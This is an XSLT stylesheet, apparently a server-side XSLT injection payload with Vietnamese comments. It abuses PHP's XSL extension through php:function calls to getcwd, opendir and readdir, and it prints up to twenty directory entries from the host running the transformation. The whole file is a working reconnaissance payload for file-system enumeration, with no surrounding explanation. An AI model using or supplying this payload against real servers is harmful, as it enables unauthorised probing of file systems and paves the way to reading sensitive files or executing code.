<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:php="http://php.net/xsl">
  <!-- Cho output kiểu HTML cho dễ đọc -->
    <xsl:output method="html" omit-xml-declaration="yes" indent="yes"/>

    <!-- Template chính, match vào root của XML -->
    <xsl:template match="/">
        <html>
        <body>
            <h1>Directory listing via XSLT</h1>

            <p>Current dir (getcwd): 
                <b><xsl:value-of select="php:function('getcwd')" /></b>
            </p>

            <pre>
<xsl:variable name="h" select="php:function('opendir','.')"/>

<!-- Mỗi cặp variable + value-of = đọc thêm 1 entry -->
<xsl:variable name="f1" select="php:function('readdir',$h)"/>
<xsl:value-of select="$f1"/><xsl:text>&#x0A;</xsl:text>

<xsl:variable name="f2" select="php:function('readdir',$h)"/>
<xsl:value-of select="$f2"/><xsl:text>&#x0A;</xsl:text>

<xsl:variable name="f3" select="php:function('readdir',$h)"/>
<xsl:value-of select="$f3"/><xsl:text>&#x0A;</xsl:text>

<xsl:variable name="f4" select="php:function('readdir',$h)"/>
<xsl:value-of select="$f4"/><xsl:text>&#x0A;</xsl:text>

<xsl:variable name="f5" select="php:function('readdir',$h)"/>
<xsl:value-of select="$f5"/><xsl:text>&#x0A;</xsl:text>

<xsl:variable name="f6" select="php:function('readdir',$h)"/>
<xsl:value-of select="$f6"/><xsl:text>&#x0A;</xsl:text>

<xsl:variable name="f7" select="php:function('readdir',$h)"/>
<xsl:value-of select="$f7"/><xsl:text>&#x0A;</xsl:text>

<xsl:variable name="f8" select="php:function('readdir',$h)"/>
<xsl:value-of select="$f8"/><xsl:text>&#x0A;</xsl:text>

<xsl:variable name="f9" select="php:function('readdir',$h)"/>
<xsl:value-of select="$f9"/><xsl:text>&#x0A;</xsl:text>

<xsl:variable name="f10" select="php:function('readdir',$h)"/>
<xsl:value-of select="$f10"/><xsl:text>&#x0A;</xsl:text>

<xsl:variable name="f11" select="php:function('readdir',$h)"/>
<xsl:value-of select="$f11"/><xsl:text>&#x0A;</xsl:text>

<xsl:variable name="f12" select="php:function('readdir',$h)"/>
<xsl:value-of select="$f12"/><xsl:text>&#x0A;</xsl:text>

<xsl:variable name="f13" select="php:function('readdir',$h)"/>
<xsl:value-of select="$f13"/><xsl:text>&#x0A;</xsl:text>

<xsl:variable name="f14" select="php:function('readdir',$h)"/>
<xsl:value-of select="$f14"/><xsl:text>&#x0A;</xsl:text>

<xsl:variable name="f15" select="php:function('readdir',$h)"/>
<xsl:value-of select="$f15"/><xsl:text>&#x0A;</xsl:text>

<xsl:variable name="f16" select="php:function('readdir',$h)"/>
<xsl:value-of select="$f16"/><xsl:text>&#x0A;</xsl:text>

<xsl:variable name="f17" select="php:function('readdir',$h)"/>
<xsl:value-of select="$f17"/><xsl:text>&#x0A;</xsl:text>

<xsl:variable name="f18" select="php:function('readdir',$h)"/>
<xsl:value-of select="$f18"/><xsl:text>&#x0A;</xsl:text>

<xsl:variable name="f19" select="php:function('readdir',$h)"/>
<xsl:value-of select="$f19"/><xsl:text>&#x0A;</xsl:text>

<xsl:variable name="f20" select="php:function('readdir',$h)"/>
<xsl:value-of select="$f20"/><xsl:text>&#x0A;</xsl:text>

            </pre>
        </body>
        </html>
    </xsl:template>

</xsl:stylesheet>
